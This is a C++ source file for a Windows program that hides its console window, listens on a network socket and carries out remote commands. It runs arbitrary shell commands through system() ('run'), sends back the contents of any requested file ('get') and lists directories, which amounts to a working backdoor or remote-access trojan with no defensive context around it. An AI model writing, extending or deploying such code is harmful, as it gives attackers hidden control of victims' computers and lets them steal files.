#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <fstream>
#include <sstream>
#include <thread>
#include <filesystem>

#include "SocketServer.h"

std::vector<std::string> split(std::string str)
{
	std::istringstream iss(str);
	std::vector<std::string> tokens;
	std::copy(std::istream_iterator<std::string>(iss),
	          std::istream_iterator<std::string>(),
	          back_inserter(tokens));
	return tokens;
}
inline bool exists_test3(const std::string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}
std::vector<BYTE> readFile(const char* filename)
{
	// open the file:
	std::ifstream file(filename, std::ios::binary);

	// Stop eating new lines in binary mode!!!
	file.unsetf(std::ios::skipws);

	// get its size:
	std::streampos fileSize;

	file.seekg(0, std::ios::end);
	fileSize = file.tellg();
	file.seekg(0, std::ios::beg);

	// reserve capacity
	std::vector<BYTE> vec;
	vec.reserve(fileSize);

	// read the data:
	vec.insert(vec.begin(),
		std::istream_iterator<BYTE>(file),
		std::istream_iterator<BYTE>());

	return vec;
}
std::vector<unsigned char> intToBytes(int paramInt)
{
	std::vector<unsigned char> arrayOfByte(4);
	for (int i = 0; i < 4; i++)
		arrayOfByte[i] = (paramInt >> (i * 8));
	return arrayOfByte;
}
int main()
{
	SocketServer server;
	server.init();

	::ShowWindow(::GetConsoleWindow(), SW_HIDE);//--
	
	std::cout << "start serving on port " << server.port << "\n";
	server.remListen();

	bool running = true;
	while (running)
	{
		std::cout << "waiting for client\n";
		server.acceptClient();

		//listen to user's commands
		const bool listenRes = server.listenLoop([&](std::vector<char> data)
			{
				std::cout << data.data() << '\n';
				std::string command = std::string(data.data());

				auto cmds = split(command);
				std::string response = "ok";
				std::vector<char> respArray = std::vector<char>(response.begin(), response.end());
				
				if (command == "kill")
				{
					running = false;
					return std::make_pair( false, respArray );
				}
				if (command == "hide")
				{
					::ShowWindow(::GetConsoleWindow(), SW_HIDE);
				}
				else if (command == "show")
				{
					::ShowWindow(::GetConsoleWindow(), SW_SHOW);
				}
				else if (command == "ls")
				{
					std::string path = "./";
					std::string result="files in dir:\n";
					for (const auto& entry : std::filesystem::directory_iterator(path))
					{
						std::cout << entry.path() << std::endl;
						result += entry.path().string()+"\n";
					}
					respArray = std::vector<char>(result.begin(), result.end());
						
				}
				else if (cmds[0] == "run")
				{
					std::string result = "";
					for (int i = 1; i < cmds.size(); ++i)
					{
						result += cmds[i] + " ";
					}
					std::thread([result]()
						{
							system(result.c_str());
						}).detach();

				}
				else if (cmds[0] == "get")
				{
					if(cmds.size() != 2)
					{
						const std::string response = "What do you want to get?";
						respArray = std::vector<char>(response.begin(), response.end());
					}
					else
					{
						if(!exists_test3(cmds[1]) || std::filesystem::is_directory(cmds[1]))
						{
							const std::string response = "File "+cmds[1]+" not found bruh";
							respArray = std::vector<char>(response.begin(), response.end());
						}
						else
						{
							auto data = readFile(cmds[1].c_str());
							auto count = intToBytes(data.size());
							std::vector<char> result;
							result.push_back(1);
							result.insert(result.end(), count.begin(), count.end());
							result.insert(result.end(), data.begin(), data.end());

							respArray = result;
						}
					}
				}
				return std::make_pair(true, respArray);
		});

		//user broke connection, keep running
		if (!listenRes && running)
			server.remListen();

		std::cout << "client closed connection\n";
	}

	server.closeSocket();
	return 0;
}
